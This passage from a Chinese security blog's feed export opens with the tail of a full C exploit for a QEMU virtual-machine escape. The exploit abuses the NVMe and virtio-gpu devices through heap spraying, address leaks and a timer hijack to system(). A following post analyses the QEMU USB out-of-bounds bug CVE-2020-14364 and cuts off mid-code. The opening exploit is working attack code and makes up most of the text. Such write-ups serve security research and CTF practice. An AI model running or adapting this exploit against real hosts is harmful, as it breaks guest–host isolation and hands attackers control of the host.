class="hljs-number">20</span>;<br>    <br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">virtio_gpu_mem_entry</span> *<span class="hljs-title">ents</span> =</span> buf + <span class="hljs-number">0x300</span>;<br>    ents[<span class="hljs-number">0</span>].addr = gva_to_gpa(payload_buf + <span class="hljs-number">2</span>);<br>    ents[<span class="hljs-number">0</span>].length = <span class="hljs-number">0x100</span>;<br>    ents[<span class="hljs-number">1</span>].addr = <span class="hljs-number">0</span>;<br>    ents[<span class="hljs-number">1</span>].length = <span class="hljs-number">0</span>;<br><br>    desc[<span class="hljs-number">0</span>].flags = <span class="hljs-number">0</span>;<br>    desc[<span class="hljs-number">0</span>].addr = gva_to_gpa(c2d);<br>    desc[<span class="hljs-number">0</span>].len = <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> virtio_gpu_resource_create_2d);<br><br>    desc[<span class="hljs-number">1</span>].flags = VRING_DESC_F_NEXT;<br>    desc[<span class="hljs-number">1</span>].addr = gva_to_gpa(ab);<br>    desc[<span class="hljs-number">1</span>].len = <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> virtio_gpu_resource_attach_backing);<br>    desc[<span class="hljs-number">1</span>].next = <span class="hljs-number">2</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">2</span>; i &lt; <span class="hljs-number">20</span>; i++)&#123;<br>        desc[i].flags = VRING_DESC_F_NEXT;<br>        desc[i].addr = gva_to_gpa(ents);<br>        desc[i].len = <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> virtio_gpu_mem_entry);<br>        desc[i].next = i + <span class="hljs-number">1</span>;<br>    &#125;<br>    desc[<span class="hljs-number">7</span>].addr = gva_to_gpa(ents + <span class="hljs-number">1</span>);<br>    desc[<span class="hljs-number">20</span>].flags = <span class="hljs-number">0</span>;<br>    desc[<span class="hljs-number">20</span>].addr = gva_to_gpa(buf + <span class="hljs-number">0x40</span>);<br>    desc[<span class="hljs-number">20</span>].len = <span class="hljs-number">0x20</span>;<br><br>    mmio_gpu_write(<span class="hljs-number">0x3000</span>, <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">set_mapping_table1</span><span class="hljs-params">()</span>&#123;<br>    avail-&gt;idx = <span class="hljs-number">3</span>;<br>    avail-&gt;ring[vq_last_avail_idx ++] = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">virtio_gpu_resource_create_2d</span> *<span class="hljs-title">c2d</span> =</span> buf + <span class="hljs-number">0x100</span>;<br>    c2d-&gt;hdr.type = VIRTIO_GPU_CMD_RESOURCE_CREATE_2D;<br>    c2d-&gt;resource_id = <span class="hljs-number">2</span>;<br>    c2d-&gt;format = <span class="hljs-number">1</span>;<br>    c2d-&gt;width = <span class="hljs-number">0x100</span>;<br>    c2d-&gt;height = <span class="hljs-number">0x100</span>;<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">virtio_gpu_resource_attach_backing</span> *<span class="hljs-title">ab</span> =</span> buf + <span class="hljs-number">0x200</span>;<br>    ab-&gt;hdr.type = VIRTIO_GPU_CMD_RESOURCE_DETACH_BACKING;<br>    ab-&gt;resource_id = <span class="hljs-number">2</span>;<br>    ab-&gt;nr_entries = <span class="hljs-number">20</span>;<br>    <br>    desc[<span class="hljs-number">0</span>].flags = VRING_DESC_F_NEXT;<br>    desc[<span class="hljs-number">0</span>].addr = gva_to_gpa(c2d);<br>    desc[<span class="hljs-number">0</span>].len = <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> virtio_gpu_resource_create_2d);<br>    desc[<span class="hljs-number">0</span>].next = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt; <span class="hljs-number">21</span>; i++)&#123;<br>        desc[i].flags = VRING_DESC_F_NEXT;<br>        desc[i].addr = gva_to_gpa(exec_cmd);<br>        desc[i].len = <span class="hljs-number">0x20</span>;<br>        desc[i].next = i + <span class="hljs-number">1</span>;<br>    &#125;<br><br>    desc[<span class="hljs-number">21</span>].flags = <span class="hljs-number">0</span>;<br>    desc[<span class="hljs-number">21</span>].addr = gva_to_gpa(exec_cmd);<br>    desc[<span class="hljs-number">21</span>].len = <span class="hljs-number">0x20</span>;<br><br>    mmio_gpu_write(<span class="hljs-number">0x3000</span>, <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">set_mapping_table2</span><span class="hljs-params">()</span>&#123;<br>    avail-&gt;idx = <span class="hljs-number">5</span>;<br>    avail-&gt;ring[vq_last_avail_idx ++] = <span class="hljs-number">0</span>;<br>    avail-&gt;ring[vq_last_avail_idx ++] = <span class="hljs-number">1</span>;<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">virtio_gpu_resource_create_2d</span> *<span class="hljs-title">c2d</span> =</span> buf + <span class="hljs-number">0x100</span>;<br>    c2d-&gt;hdr.type = VIRTIO_GPU_CMD_RESOURCE_CREATE_2D;<br>    c2d-&gt;resource_id = <span class="hljs-number">3</span>;<br>    c2d-&gt;format = <span class="hljs-number">1</span>;<br>    c2d-&gt;width = <span class="hljs-number">0x100</span>;<br>    c2d-&gt;height = <span class="hljs-number">0x100</span>;<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">virtio_gpu_resource_attach_backing</span> *<span class="hljs-title">ab</span> =</span> buf + <span class="hljs-number">0x200</span>;<br>    ab-&gt;hdr.type = VIRTIO_GPU_CMD_RESOURCE_DETACH_BACKING;<br>    ab-&gt;resource_id = <span class="hljs-number">3</span>;<br>    ab-&gt;nr_entries = <span class="hljs-number">20</span>;<br>    <br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">virtio_gpu_mem_entry</span> *<span class="hljs-title">ents</span> =</span> buf + <span class="hljs-number">0x300</span>;<br>    ents[<span class="hljs-number">0</span>].addr = gva_to_gpa(payload_buf + <span class="hljs-number">2</span>);<br>    ents[<span class="hljs-number">0</span>].length = <span class="hljs-number">0x100</span>;<br>    ents[<span class="hljs-number">1</span>].addr = <span class="hljs-number">0</span>;<br>    ents[<span class="hljs-number">1</span>].length = <span class="hljs-number">0</span>;<br><br>    desc[<span class="hljs-number">0</span>].flags = <span class="hljs-number">0</span>;<br>    desc[<span class="hljs-number">0</span>].addr = gva_to_gpa(c2d);<br>    desc[<span class="hljs-number">0</span>].len = <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> virtio_gpu_resource_create_2d);<br><br>    desc[<span class="hljs-number">1</span>].flags = VRING_DESC_F_NEXT;<br>    desc[<span class="hljs-number">1</span>].addr = gva_to_gpa(ab);<br>    desc[<span class="hljs-number">1</span>].len = <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> virtio_gpu_resource_attach_backing);<br>    desc[<span class="hljs-number">1</span>].next = <span class="hljs-number">2</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">2</span>; i &lt; <span class="hljs-number">20</span>; i++)&#123;<br>        desc[i].flags = VRING_DESC_F_NEXT;<br>        desc[i].addr = gva_to_gpa(ents);<br>        desc[i].len = <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> virtio_gpu_mem_entry);<br>        desc[i].next = i + <span class="hljs-number">1</span>;<br>    &#125;<br>    desc[<span class="hljs-number">7</span>].addr = gva_to_gpa(ents + <span class="hljs-number">1</span>);<br>    desc[<span class="hljs-number">20</span>].flags = <span class="hljs-number">0</span>;<br>    desc[<span class="hljs-number">20</span>].addr = gva_to_gpa(buf + <span class="hljs-number">0x40</span>);<br>    desc[<span class="hljs-number">20</span>].len = <span class="hljs-number">0x20</span>;<br><br>    mmio_gpu_write(<span class="hljs-number">0x3000</span>, <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">int</span>  mmio_fd = open(<span class="hljs-string">&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;</span>, O_RDWR | O_SYNC);<br>    mmio_nvme         = mmap(<span class="hljs-number">0</span>, <span class="hljs-number">0x2000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="hljs-number">0</span>);<br>    <span class="hljs-type">int</span>  mmio_fd1 = open(<span class="hljs-string">&quot;/sys/devices/pci0000:00/0000:00:05.0/resource4&quot;</span>, O_RDWR | O_SYNC);<br>    mmio_gpu         = mmap(<span class="hljs-number">0</span>, <span class="hljs-number">0x4000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd1, <span class="hljs-number">0</span>);<br><br>    buf = mmap(<span class="hljs-number">0</span>, <span class="hljs-number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-built_in">memset</span>(buf, <span class="hljs-number">0</span>, <span class="hljs-number">0x1000</span>);<br>    avail = buf;<br>    payload_buf = buf + <span class="hljs-number">0x400</span>;<br><br>    desc_buf = mmap(<span class="hljs-number">0</span>, <span class="hljs-number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-built_in">memset</span>(desc_buf, <span class="hljs-number">0</span>, <span class="hljs-number">0x1000</span>);<br>    desc = desc_buf;<br><br>    nvme_buf = mmap(<span class="hljs-number">0</span>, <span class="hljs-number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-built_in">memset</span>(nvme_buf, <span class="hljs-number">0</span>, <span class="hljs-number">0x1000</span>);<br>    nvme_cmd = nvme_buf;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] STEP 1 heap spray&quot;</span>);<br>    init_nvme();<br>    sleep(<span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt; <span class="hljs-number">0x28</span>; ++i)&#123;<br>        nvme_create_cq(i);<br>    &#125;<br>    mmio_nvme_write(<span class="hljs-number">0x1000</span>, sq_tail);<br>    sleep(<span class="hljs-number">1</span>);<br>    <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] STEP 2 set mapping table for free&quot;</span>);<br>    init_gpu();<br>    set_mapping_table();<br>    sleep(<span class="hljs-number">1</span>);<br>    <span class="hljs-comment">//本地初始0x150的tcache只有4个，g_free(ents)后ents也会进入，所以需要多创建一个sq</span><br>    nvme_create_sq(<span class="hljs-number">1</span>, <span class="hljs-number">1</span>);<br>    nvme_create_sq(<span class="hljs-number">2</span>, <span class="hljs-number">1</span>);<br>    mmio_nvme_write(<span class="hljs-number">0x1000</span>, sq_tail);<br>    sleep(<span class="hljs-number">1</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] STEP 3 free the vuln_addr&quot;</span>);<br>    payload_buf[<span class="hljs-number">1</span>] = <span class="hljs-number">0x291</span>;<br>    payload_buf[<span class="hljs-number">0x53</span>] = <span class="hljs-number">0x21</span>;<br>    vuln(<span class="hljs-number">2</span>);<br>    sleep(<span class="hljs-number">1</span>);<br>    <span class="hljs-type">size_t</span> leak_heap_addr = payload_buf[<span class="hljs-number">2</span>];<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] leak_heap_addr_is %#lx\n&quot;</span>, leak_heap_addr);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] STEP 4 leak host&#x27;s physmap addr in qemu&quot;</span>);<br>    set_mapping_table1();<br>    sleep(<span class="hljs-number">1</span>);<br>    <span class="hljs-type">size_t</span> physmap_addr = payload_buf[<span class="hljs-number">0x28</span>];<br>    <span class="hljs-type">size_t</span> physmap_base = physmap_addr - gva_to_gpa(exec_cmd);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] leak_host_physmap_addr_is %#lx\n&quot;</span>, physmap_addr);<br>    sleep(<span class="hljs-number">1</span>);<br>    <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] STEP 5 free vuln_addr&quot;</span>);<br>    payload_buf = buf + <span class="hljs-number">0x800</span>;<br>    set_mapping_table2();<br>    nvme_create_sq(<span class="hljs-number">3</span>, <span class="hljs-number">1</span>);<br>    nvme_create_sq(<span class="hljs-number">4</span>, <span class="hljs-number">1</span>);<br>    mmio_nvme_write(<span class="hljs-number">0x1000</span>, sq_tail);<br>    sleep(<span class="hljs-number">1</span>);<br>    payload_buf[<span class="hljs-number">1</span>] = <span class="hljs-number">0x41</span>;<br>    payload_buf[<span class="hljs-number">9</span>] = <span class="hljs-number">0x21</span>;<br>    vuln(<span class="hljs-number">4</span>);<br>    sleep(<span class="hljs-number">1</span>);<br>    nvme_create_sq(<span class="hljs-number">5</span>, <span class="hljs-number">1</span>);<br>    mmio_nvme_write(<span class="hljs-number">0x1000</span>, sq_tail);<br>    sleep(<span class="hljs-number">1</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] STEP 6 leak qemu addr and hijack timer&quot;</span>);<br>    <span class="hljs-type">size_t</span> elf_addr = payload_buf[<span class="hljs-number">4</span>];<br>    <span class="hljs-type">size_t</span> elf_base = elf_addr - <span class="hljs-number">0x517c76</span>;<br>    <span class="hljs-type">size_t</span> system_plt = elf_base + <span class="hljs-number">0x2bc790</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] leak_elf_addr_is %#lx\n&quot;</span>, elf_addr);<br>    payload_buf[<span class="hljs-number">4</span>] = system_plt;<br>    payload_buf[<span class="hljs-number">5</span>] = physmap_addr;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] start escape&quot;</span>);<br>    mmio_nvme_write(<span class="hljs-number">0x1000</span> + <span class="hljs-number">5</span> * <span class="hljs-number">8</span>, <span class="hljs-number">1</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>最后弹出计算器</p><img src="/img/22/Screenshot 2023-10-18 214923.png" style="zoom:80%;" /><p>​                                    </p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2020-14364</title>
    <link href="/2023/10/11/CVE-2020-14364/"/>
    <url>/2023/10/11/CVE-2020-14364/</url>
    
    <content type="html"><![CDATA[<p>CVE-2020-14364是qemu5.2.0版本前存在的漏洞，可以借助usb这个常见设备进行逃逸。</p><p>环境搭建和分析可以直接参考：<a href="https://xz.aliyun.com/t/8320">https://xz.aliyun.com/t/8320</a>                                       </p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>在<a href="https://elixir.bootlin.com/qemu/v4.2.1/source/hw/usb/core.c#L129">do_token_setup函数</a>中的<code>s-&gt;setup_len &gt; sizeof(s-&gt;data_buf)</code>判断大小越界后，直接返回，但是<code>s-&gt;setup_len</code>中依然为一个越界的大小，并且在接下来的do_token_in和do_token_out函数中可以利用该值去进行越界读写，在此过程中没有任何对<code>s-&gt;setup_len</code>的判断。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">do_token_setup</span><span class="hljs-params">(USBDevice *s, USBPacket *p)</span><br>&#123;<br>    <span class="hljs-type">int</span> request, value, index;<br><br>    <span class="hljs-keyword">if</span> (p-&gt;iov.size != <span class="hljs-number">8</span>) &#123;<br>        p-&gt;status = USB_RET_STALL;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    usb_packet_copy(p, s-&gt;setup_buf, p-&gt;iov.size);<br>    s-&gt;setup_index = <span class="hljs-number">0</span>;<br>    p-&gt;actual_length = <span class="hljs-number">0</span>;<br>    s-&gt;setup_len   = (s-&gt;setup_buf[<span class="hljs-number">7</span>] &lt;&lt; <span class="hljs-number">8</span>) | s-&gt;setup_buf[<span class="hljs-number">6</span>];<br>    <span class="hljs-keyword">if</span> (s-&gt;setup_len &gt; <span class="hljs-keyword">sizeof</span>(s-&gt;data_buf)) &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>,<br>                <span class="hljs-string">&quot;usb_generic_handle_packet: ctrl buffer too small (%d &gt; %zu)\n&quot;</span>,<br>                s-&gt;setup_len, <span class="hljs-keyword">sizeof</span>(s-&gt;data_buf));<br>        p-&gt;status = USB_RET_STALL;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    ………………<br>    ………………<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">do_token_in</span><span class="hljs-params">(USBDevice *s, USBPacket *p)</span><br>&#123;<br>    ………………<br>    ………………<br>    <span class="hljs-keyword">case</span> SETUP_STATE_DATA:<br>        <span class="hljs-keyword">if</span> (s-&gt;setup_buf[<span class="hljs-number">0</span>] &amp; USB_DIR_IN) &#123;<br>            <span class="hljs-type">int</span> len = s-&gt;setup_len - s-&gt;setup_index;<br>            <span class="hljs-keyword">if</span> (len &gt; p-&gt;iov.size) &#123;<br>                len = p-&gt;iov.size;<br>            &#125;<br>            usb_packet_copy(p, s-&gt;data_buf + s-&gt;setup_index, len);<br>            s-&gt;setup_index += len;<br>            <span class="hljs-keyword">if</span> (s-&gt;setup_index &gt;= s-&gt;setup_len) &#123;<br>                s-&gt;setup_state = SETUP_STATE_ACK;<br>            &#125;<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>    ………………<br>    ………………<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">do_token_out</span><span class="hljs-params">(USBDevice *s, USBPacket *p)</span><br>&#123;<br>    ………………<br>    ………………<br>    <span class="hljs-keyword">case</span> SETUP_STATE_DATA:<br>        <span class="hljs-keyword">if</span> (!(s-&gt;setup_buf[<span class="hljs-number">0</span>] &amp; USB_DIR_IN)) &#123;<br>            <span class="hljs-type">int</span> len = s-&gt;setup_len - s-&gt;setup_index;<br>            <span class="hljs-keyword">if</span> (len &gt; p-&gt;iov.size) &#123;<br>                len = p-&gt;iov.size;<br>            &#125;<br>            usb_packet_copy(p, s-&gt;data_buf + s-&gt;setup_index, len);<br>            s-&gt;setup_index += len;<br>            <span class="hljs-keyword">if</span> (s-&gt;setup_index &gt;= s-&gt;setup_len) &#123;<br>                s-&gt;setup_state = SETUP_STATE_ACK;<br>            &#125;<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>    ………………<br>    ………………<br>&#125;<br></code></pre></td></tr></table></figure><p>​                                                       </p><h2 id="触发漏洞函数"><a href="#触发漏洞函数" class="headerlink" title="触发漏洞函数"></a>触发漏洞函数</h2><p>使用elixir.bootlin这个网站可以很方便去寻找函数的交叉引用，一顿狂点鼠标最终找到的上层函数调用链如下：</p><p>do_token_setup—&gt;usb_process_one —&gt;usb_handle_packet —&gt;ehci_execute—&gt;ehci_state_execute —&gt;ehci_advance_state —&gt;ehci_advance_periodic_state —&gt;ehci_work_bh</p><p>而最后的ehci_work_bh函数是由usb_ehci_realize函数所引用：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">usb_ehci_realize</span><span class="hljs-params">(EHCIState *s, DeviceState *dev, Error **errp)</span><br>&#123;<br>    ……………………<br>    s-&gt;frame_timer = timer_new_ns(QEMU_CLOCK_VIRTUAL, ehci_work_timer, s);<br>    s-&gt;async_bh = qemu_bh_new(ehci_work_bh, s);<br>    ……………………<br>&#125;<br></code></pre></td></tr></table></figure><p>但是usb_ehci_realize函数是没有真正调用ehci_work_bh，这里只是将ehci_work_bh函数创建为底半部（bottom half），想到曾经复现过hfctf2022中的qemu题也是这种，qemu的bottom half与timers相似：timers是timer_mod触发、bottom half是qemu_bh_schedule触发，最后由另一个线程去执行。</p><p>最后进一步去找<code>qemu_bh_schedule(s-&gt;async_bh)</code>的调用，可以找到ehci_opreg_wrie函数。</p><p>​                                                    </p><p>ehci_opreg_wrie就是CTF题中常见的设备write函数，函数先通过addr这个值去访问opreg联合体相应的变量，通过mmio这个变量再去由val赋值：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs c"> <span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">ehci_opreg_write</span><span class="hljs-params">(<span class="hljs-type">void</span> *ptr, hwaddr addr,</span><br><span class="hljs-params">                             <span class="hljs-type">uint64_t</span> val, <span class="hljs-type">unsigned</span> size)</span><br>&#123;<br>    EHCIState *s = ptr;<br>    <span class="hljs-type">uint32_t</span> *mmio = s-&gt;opreg + (addr &gt;&gt; <span class="hljs-number">2</span>);<br>    <span class="hljs-type">uint32_t</span> old = *mmio;<br>    <span class="hljs-type">int</span> i;<br><br>    trace_usb_ehci_opreg_write(addr + s-&gt;opregbase, addr2str(addr), val);<br><br>    <span class="hljs-keyword">switch</span> (addr) &#123;<br>    <span class="hljs-keyword">case</span> USBCMD:<br>       …………………………<br>       …………………………<br>        <span class="hljs-keyword">if</span> (((USBCMD_RUNSTOP | USBCMD_PSE | USBCMD_ASE) &amp; val) !=<br>            ((USBCMD_RUNSTOP | USBCMD_PSE | USBCMD_ASE) &amp; s-&gt;usbcmd)) &#123;<br>            <span class="hljs-keyword">if</span> (s-&gt;pstate == EST_INACTIVE) &#123;<br>                SET_LAST_RUN_CLOCK(s);<br>            &#125;<br>            s-&gt;usbcmd = val; <span class="hljs-comment">/* Set usbcmd for ehci_update_halt() */</span><br>            ehci_update_halt(s);<br>            s-&gt;async_stepdown = <span class="hljs-number">0</span>;<br>            qemu_bh_schedule(s-&gt;async_bh);<br>        &#125;<br>        <span class="hljs-keyword">break</span>;<br>     <span class="hljs-keyword">case</span> USBSTS:<br>        val &amp;= USBSTS_RO_MASK;              <span class="hljs-comment">// bits 6 through 31 are RO</span><br>        ehci_clear_usbsts(s, val);          <span class="hljs-comment">// bits 0 through 5 are R/WC</span><br>        val = s-&gt;usbsts;<br>        ehci_update_irq(s);<br>        <span class="hljs-keyword">break</span>;<br>    …………………………<br>    …………………………<br>    <span class="hljs-keyword">case</span> FRINDEX:<br>        val &amp;= <span class="hljs-number">0x00003fff</span>; <span class="hljs-comment">/* frindex is 14bits */</span><br>        s-&gt;usbsts_frindex = val;<br>        <span class="hljs-keyword">break</span>;<br>    …………………………<br>    …………………………<br>    <br>    *mmio = val;<br>    trace_usb_ehci_opreg_change(addr + s-&gt;opregbase, addr2str(addr),<br>                                *mmio, old);<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>        <span class="hljs-type">uint32_t</span> opreg[<span class="hljs-number">0x44</span>/<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">uint32_t</span>)];<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>            <span class="hljs-type">uint32_t</span> usbcmd;<br>            <span class="hljs-type">uint32_t</span> usbsts;<br>            <span class="hljs-type">uint32_t</span> usbintr;<br>            <span class="hljs-type">uint32_t</span> frindex;<br>            <span class="hljs-type">uint32_t</span> ctrldssegment;<br>            <span class="hljs-type">uint32_t</span> periodiclistbase;<br>            <span class="hljs-type">uint32_t</span> asynclistaddr;<br>            <span class="hljs-type">uint32_t</span> notused[<span class="hljs-number">9</span>];<br>            <span class="hljs-type">uint32_t</span> configflag;<br>        &#125;;<br>    &#125;;<br></code></pre></td></tr></table></figure><p>​                                                       </p><p>在ehci_work_bh中会对usbcmd这个值进行一些判断才会调用ehci_advance_periodic_state，原始的usbcmd &#x3D; 0x10001无法满足判断，需要使用ehci_opreg_wrie函数对usbcmd重新赋值。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">ehci_work_bh</span><span class="hljs-params">(<span class="hljs-type">void</span> *opaque)</span><br>&#123;<br>    …………………………<br>    …………………………<br>    <span class="hljs-keyword">if</span> (ehci_periodic_enabled(ehci) || ehci-&gt;pstate != EST_INACTIVE) &#123;<br>        need_timer++;<br>    …………………………<br>    …………………………<br>        <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; uframes; i++) &#123;<br>            <span class="hljs-comment">/*</span><br><span class="hljs-comment">             * If we&#x27;re running behind schedule, we should not catch up</span><br><span class="hljs-comment">             * too fast, as that will make some guests unhappy:</span><br><span class="hljs-comment">             * 1) We must process a minimum of MIN_UFR_PER_TICK frames,</span><br><span class="hljs-comment">             *    otherwise we will never catch up</span><br><span class="hljs-comment">             * 2) Process frames until the guest has requested an irq (IOC)</span><br><span class="hljs-comment">             */</span><br>            <span class="hljs-keyword">if</span> (i &gt;= MIN_UFR_PER_TICK) &#123;<br>                ehci_commit_irq(ehci);<br>                <span class="hljs-keyword">if</span> ((ehci-&gt;usbsts &amp; USBINTR_MASK) &amp; ehci-&gt;usbintr) &#123;<br>                    <span class="hljs-keyword">break</span>;<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (ehci-&gt;periodic_sched_active) &#123;<br>                ehci-&gt;periodic_sched_active--;<br>            &#125;<br>            ehci_update_frindex(ehci, <span class="hljs-number">1</span>);<br>            <span class="hljs-keyword">if</span> ((ehci-&gt;frindex &amp; <span class="hljs-number">7</span>) == <span class="hljs-number">0</span>) &#123;<br>                